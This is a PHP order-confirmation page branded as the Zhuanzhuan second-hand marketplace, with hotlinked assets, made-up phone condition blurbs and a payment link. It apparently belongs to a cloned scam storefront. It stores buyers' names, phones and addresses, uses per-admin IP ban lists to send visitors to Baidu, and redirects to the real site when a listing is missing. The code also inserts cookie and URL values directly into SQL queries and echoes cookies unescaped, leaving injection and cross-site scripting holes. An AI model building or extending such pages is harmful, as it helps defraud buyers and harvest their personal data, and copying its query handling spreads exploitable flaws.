<!DOCTYPE html>

<?php
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');

setcookie('GoodsID4',$_COOKIE['GoodsID3']);
//写入订单号
setcookie('orderid',$zhuanzhuanORDER);


if($_COOKIE['GoodsID3']){


	    $cookTel=substr_replace($_COOKIE['se_tel'],'****',3,4);


	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_COOKIE['GoodsID3']}'") or die('SQL执行错误');

		//判断操作记录数据是否存在，存在就更新此数据状态为2订单页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE gid='{$_COOKIE['GoodsID3']}'");
	if($_OID){
		_query("
			UPDATE
				useraddress
			SET
				state=2,
				utime='{$_CURRENT_TIME}'
			WHERE
				gid='{$_COOKIE['GoodsID3']}' LIMIT 1") or die(mysql_error());


		if($_COOKIE['se_name']){
			if($_OID){
			  _query("
				  UPDATE
					  useraddress
				  SET
					  uadd='{$_COOKIE['se_address']}',
					  utel='{$_COOKIE['se_tel']}',
					  uname='{$_COOKIE['se_name']}',
					  orderid='{$zhuanzhuanORDER}',
					  state=3
				  WHERE
					  gid='{$_COOKIE['GoodsID3']}' LIMIT 1");

			}
		}
		  _close();
		  session_destroy();

	}

}
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){
       header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}
$ip=getIP();

if($_GET['ClickID']){
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_GET['ClickID']}' AND is_shelves=1");
	
	//做禁止IP访问
	$_BANIP = _fetch_array("SELECT * FROM admin_user WHERE au_id='{$_GoodsID['in_admin_id']}'");
	$BANIP=$_BANIP['BanIP'];
	if (stristr($BANIP, $ip)) {
		header('Location:'. htmlspecialchars_decode('http://www.baidu.com').'');
	}
	
	if($_GoodsID==0){
                echo "<script language=\"javascript\">
  document.location.href=\"http://m.zhuanzhuan.com\";
</script>";
                exit;
            }
	
	//判断访问记录是否存在，如果不存在则插入记录，条件更具当前ID和当前商品ID

	//跳转地址
	if(!$_GoodsID){
		
	}
	//更新点击率	
	mysql_query("UPDATE goods SET hits = hits+1 WHERE goods_id = $_GET[ClickID]; ");
}else{
	
}
if($_GoodsID['oldnew']==1)
$oldnew888="全新";

if($_GoodsID['oldnew']==2)
$oldnew888="99新";
$oldnew666="仅激活，未使用过，全部功能正常，如下为真机实拍图";
if($_GoodsID['oldnew']==3)
$oldnew888="98新";
$oldnew666="相当于新机仅使用一周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
if($_GoodsID['oldnew']==4)
$oldnew888="95新";
$oldnew666="相当于新机仅使用二周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
if($_GoodsID['oldnew']==5)
$oldnew888="88新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";
if($_GoodsID['oldnew']==6)
$oldnew888="85新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";


if($_GoodsID['oldnewa']==1)
$oldnewa88="2G";
if($_GoodsID['oldnewa']==2)
$oldnewa88="4G";
if($_GoodsID['oldnewa']==3)
$oldnewa88="6G";
if($_GoodsID['oldnewa']==4)
$oldnewa88="8G";

if($_GoodsID['oldnewb']==1)
$oldnewb888="64G";
if($_GoodsID['oldnewb']==2)
$oldnewb888="128G";
if($_GoodsID['oldnewb']==3)
$oldnewb888="256G";
if($_GoodsID['oldnewb']==4)
$oldnewb888="512G";


if($_GoodsID['oldnewe']==1){
$oldnewe9999="none";
$oldnewe8888="block";
$oldnewe7777="官方验机";
    
}
if($_GoodsID['oldnewe']==2){
$oldnewe9999="0";
$oldnewe8888="none";
$oldnewe7777="支持验机";
}


?>
<html lang="zh-CN" data-dpr="1" style="font-size: 36px;">
<head>
    <meta charset="utf-8"><title>确认下单</title><link rel="dns-prefetch" href="https://s1.zhuanstatic.com"><link rel="dns-prefetch" href="https://img1.zhuanstatic.com"><meta name="description" content="确认下单"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta content="telephone=no,email=no" name="format-detection"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="default">
    	<link rel="stylesheet" href="123.css">


		<div  class="index_homeBox_1EJ2A"><div class="address_address_2xT4F" onClick="window.location='address.php?gid=<?php echo $_GoodsID['goods_id']; ?>'"><i class="address_address-iconarrow_3WnKL"></i><i class="address_address-locitonicon_2md3K"></i><div class="address_address-detail_Brolw"><div class="address_address-detail-info_3r0Q8" ><?php if($_COOKIE['se_name']){?><?php echo $_COOKIE['se_name']; ?><?php }?><div class="address_address-detail-info-tel_2QpyR" ><?php
	if($_COOKIE['se_name'])
	{
		echo "";
	}
	else
	{
		echo "新增地址";
	}
	?><?php if($_COOKIE['se_tel']){?><?php echo $_COOKIE['se_tel']; ?><?php }?></div></div><div id="dd" class="address_address-detail-info-address_2hW7p"><?php if($_COOKIE['se_ne']){?><?php echo $_COOKIE['se_ne']; ?><?php }?><?php if($_COOKIE['se_address']){?><?php echo $_COOKIE['se_address']; ?><?php }?></div></div></div><div class="order_bottom20_1Dyos"><div><div ><div class="order_information_3gWEx"><div class="order_imgbox_3Q-c1" style="background-image: url(&quot;<?php echo $_GoodsID['user_portrait']; ?>&quot;); background-color: rgb(255, 255, 255); background-size: cover; background-position: center center;"></div><p class="order_name_3dtpF"></p></div></div></div><div>
	    
	    
	    </form>
	    <div class="order_seller_2MLAL"><div class="order_information_3gWEx"><div class="order_imgbox_3Q-c1" style="background-image: url(<?php echo $_GoodsID['user_portrait']; ?>); background-color: rgb(255, 255, 255); background-size: cover; background-position: center center;"></div><p class="order_name_3dtpF"><?php echo $_GoodsID['user_name']; ?></p><br><span style="color:#8B8B7A">本商品由用户<?php echo $_GoodsID['user_name']; ?>寄卖，转转仅提供平台服务 </span></div></div>
	    
	    <div class="order_goods_xPjyT"><div class="order_goods-box_SrZgz"><div class="order_goods-box-img_2bb9o" style="background-image: url(<?php echo $_GoodsID['goods_img1']; ?>); background-color: rgb(255, 255, 255); background-size: cover; background-position: center center;"></div><div class="order_goods-box-detail_3k9_A"><p class="order_title_Ga8Bs"><?php echo $oldnew888;?> <?php echo $_GoodsID['title']; ?>&nbsp;</p><br> <p class="order_spudesc_2G6_d"></p><div class="order_price_3ojfY"><span class="order_pricemoney_81naJ"><i>¥&nbsp;</i><?php echo $_GoodsID['price']; ?>.00</span></div></div></div></div>

<div class="specialServiceWrap">
					<div class="specialService" style="background:#fff;">
						    			
					<div class="order_presents_2TJSn"><div class="order_presents-box_3m3za"><p class="order_presents-box-tilte_2Zv0r">赠品</p>
					
					<div class="order_presents-box-icon_3BbmR">
					    
					</div><div class="order_presents-box-items_3loUp"
					><span class="order_left_1XUiT">充电头+数据线</span><span class="order_right_ULfDP">¥0</span><br></div></div></div>
					
				</div>
				<div class="order_serviceshow_tCzH5"><div class="order_serviceshow-box_3LP_8"><div class="order_serviceshow-box-list_1Jhmy"><div class="order_item_39RqS"><div class="order_zzplus_3Qbsx order_zzplusbackground_10V9U"><div class="order_leftClick_CVvru order_blocknone_3ZMVB order_selected_116Nj order_selectedis_16TvU"><i class="order_icon-select_GzCSu"></i></div><div class="order_rigthtshow_1n4wb"><div class="order_top_3xUiD"><div><span class="order_title_Ga8Bs">
			官方验机</span><i onclick="yuehao();" class="order_iconq_3q9rh"></i></div><div class="order_price_3ojfY"><span class="order_originPriceCent_2OZXu">原价39</span></div></div><div class="order_bottom_3W9vp"><span class="order_title_Ga8Bs">官方提供专业验机服务，并出具验机报告</span><i class="order_imgbox_3Q-c1" style="background-image: url(&quot;https://zzpic3.58cdn.com.cn/zhuanzh/n_v246b62c3d84644fcebaf9e49a3eb7eaaa.png?w=152&amp;h=56&quot;); background-color: rgb(255, 255, 255); background-position: center center;"></i></div></div></div></div></div></div></div>
				</div>
				
				</div>
				
				</div>

				
				  <script type="text/javascript">
function yuehao() {
    var yuehao01 = document.getElementById("yuehao01");
		yuehao01.style.display="";
}
function yuehao02() {
    var yuehao01 = document.getElementById("yuehao01");
		yuehao01.style.display="none";
}


</script>

<div id="yuehao01" style="display:none;">
<div class="Popup_popup_OeY0H"><div class="Popup_popup-title_1beJO">官方验机服务</div><div class="Popup_popup-box_fdx50"><ul><li><div class="Popup_li-tilte_1vXPV">服务介绍</div><p><i></i>验机服务由转转专业质检师在质检车间内完成，专业靠谱</p><p><i></i>每一部手机经过全方位检测，形成专业透明的手机验机报告</p></li><li><div class="Popup_li-tilte_1vXPV">流程介绍</div><p><i style="background-image: url(&quot;https://img.58cdn.com.cn/zhuanzhuan/zz/service/stepIcon/1@3x.png&quot;); background-size: cover; background-position: center center;"></i>卖家将商品寄存平台，平台提前验机并出具验机报告</p><p><i style="background-image: url(&quot;https://img.58cdn.com.cn/zhuanzhuan/zz/service/stepIcon/2@3x.png&quot;); background-size: cover; background-position: center center;"></i>买家购买用户寄卖商品</p><p><i style="background-image: url(&quot;https://img.58cdn.com.cn/zhuanzhuan/zz/service/stepIcon/3@3x.png&quot;); background-size: cover; background-position: center center;"></i>平台直接为买家发货并为卖家发起打款</p></li></ul><div onclick="yuehao02();" class="Popup_close_lLCU7"></div></div></div></div>



				<div class="pay-courier_bottom20_hoxfP"><div class="pay-courier_pay_1EDMT"><div class="pay-courier_pay-choose_1O9fr"><span isNaN>平台配送（平台发货至买家）</span><div class="pay-courier_courier-contain-right_1nj85">快递 ¥ 0.00</div></div></div>
				<div><div class="red-promotion_redenvelope_2aEl3">
				    <div class="red-promotion_redenvelope-contain_NkP4B"><span>红包</span><div>暂无可用红包<a href="hb.php"><i class="red-promotion_iconarrow_T7BAf"></i></a></div>
				    
				    </div></div></div></div><div><div class="priceshow_priceshow_3fuFp"><div class="priceshow_priceshow-box_1sqo6"><div class="priceshow_priceshow-box-items_jArXG"><span class="priceshow_left_1-vHH">商品总额</span><span class="priceshow_right_VKmty"><span class="priceshow_b_2u4GK"> ¥<?php echo $_GoodsID['price']; ?>.00</span></span></div><div class="priceshow_priceshow-box-items_jArXG"><span class="priceshow_left_1-vHH">运费</span><span class="priceshow_right_VKmty">+ ¥0.00</span></div><div class="priceshow_priceshow-box-items_jArXG"><span class="priceshow_left_1-vHH">转转服务费</span><span class="priceshow_right_VKmty">+ 0.00</span></div></div></div></div><div class="place-order_placeorder_1RKQv "><div class="place-order_placeorder-contain_3Uct1 "><span>合计：¥<?php echo $_GoodsID['price']; ?>.00</span><div class="place-order_placeorder-contain-right_3XCWi" onClick="location.href='payment_number.php'">确认下单</div></div></div></div></div>
</body>
<script>

	/*    利用js计算当前设备的DPR，动态设置在html标签上，并动态设置html的font-size，*/
	!function(win, lib) {
		var timer,
				doc     = win.document,
				docElem = doc.documentElement,

				vpMeta   = doc.querySelector('meta[name="viewport"]'),
				flexMeta = doc.querySelector('meta[name="flexible"]'),

				dpr   = 0,
				scale = 0,

				flexible = lib.flexible || (lib.flexible = {});

		// 设置了 viewport meta
		if (vpMeta) {

			console.warn("将根据已有的meta标签来设置缩放比例");
			var initial = vpMeta.getAttribute("content").match(/initial\-scale=([\d\.]+)/);

			if (initial) {
				scale = parseFloat(initial[1]); // 已设置的 initialScale
				dpr = parseInt(1 / scale);      // 设备像素比 devicePixelRatio
			}

		}
		// 设置了 flexible Meta
		else if (flexMeta) {
			var flexMetaContent = flexMeta.getAttribute("content");
			if (flexMetaContent) {

				var initial = flexMetaContent.match(/initial\-dpr=([\d\.]+)/),
						maximum = flexMetaContent.match(/maximum\-dpr=([\d\.]+)/);

				if (initial) {
					dpr = parseFloat(initial[1]);
					scale = parseFloat((1 / dpr).toFixed(2));
				}

				if (maximum) {
					dpr = parseFloat(maximum[1]);
					scale = parseFloat((1 / dpr).toFixed(2));
				}
			}
		}

		// viewport 或 flexible
		// meta 均未设置
		if (!dpr && !scale) {
			// QST
			// 这里的 第一句有什么用 ?
			// 和 Android 有毛关系 ?
			var u = (win.navigator.appVersion.match(/android/gi), win.navigator.appVersion.match(/iphone/gi)),
					_dpr = win.devicePixelRatio;

			// 所以这里似乎是将所有 Android 设备都设置为 1 了
			dpr = u ? ( (_dpr >= 3 && (!dpr || dpr >= 3))
							? 3
							: (_dpr >= 2 && (!dpr || dpr >= 2))
									? 2
									: 1
					)
					: 1;

			scale = 1 / dpr;
		}

		docElem.setAttribute("data-dpr", dpr);

		// 插入 viewport meta
		if (!vpMeta) {
			vpMeta = doc.createElement("meta");

			vpMeta.setAttribute("name", "viewport");
			vpMeta.setAttribute("content",
					"initial-scale=" + scale + ", maximum-scale=" + scale + ", minimum-scale=" + scale + ", user-scalable=no");

			if (docElem.firstElementChild) {
				docElem.firstElementChild.appendChild(vpMeta)
			} else {
				var div = doc.createElement("div");
				div.appendChild(vpMeta);
				doc.write(div.innerHTML);
			}
		}

		function setFontSize() {
			var winWidth = docElem.getBoundingClientRect().width;

			if (winWidth / dpr > 540) {
				(winWidth = 540 * dpr);
			}

			// 根节点 fontSize 根据宽度决定
			var baseSize = winWidth / 10;

			docElem.style.fontSize = baseSize + "px";
			flexible.rem = win.rem = baseSize;
		}

		// 调整窗口时重置
		win.addEventListener("resize", function() {
			clearTimeout(timer);
			timer = setTimeout(setFontSize, 300);
		}, false);


		// 这一段是我自己加的
		// orientationchange 时也需要重算下吧
		win.addEventListener("orientationchange", function() {
			clearTimeout(timer);
			timer = setTimeout(setFontSize, 300);
		}, false);


		// pageshow
		// keyword: 倒退 缓存相关
		win.addEventListener("pageshow", function(e) {
			if (e.persisted) {
				clearTimeout(timer);
				timer = setTimeout(setFontSize, 300);
			}
		}, false);

		// 设置基准字体
		if ("complete" === doc.readyState) {
			doc.body.style.fontSize =12 * dpr + "px";
		} else {
			doc.addEventListener("DOMContentLoaded", function() {
				doc.body.style.fontSize = 12 * dpr + "px";
			}, false);
		}

		setFontSize();

		flexible.dpr = win.dpr = dpr;

		flexible.refreshRem = setFontSize;

		flexible.rem2px = function(d) {
			var c = parseFloat(d) * this.rem;
			if ("string" == typeof d && d.match(/rem$/)) {
				c += "px";
			}
			return c;
		};

		flexible.px2rem = function(d) {
			var c = parseFloat(d) / this.rem;

			if ("string" == typeof d && d.match(/px$/)) {
				c += "rem";
			}
			return c;
		}
	}(window, window.lib || (window.lib = {}));
</script>

</html>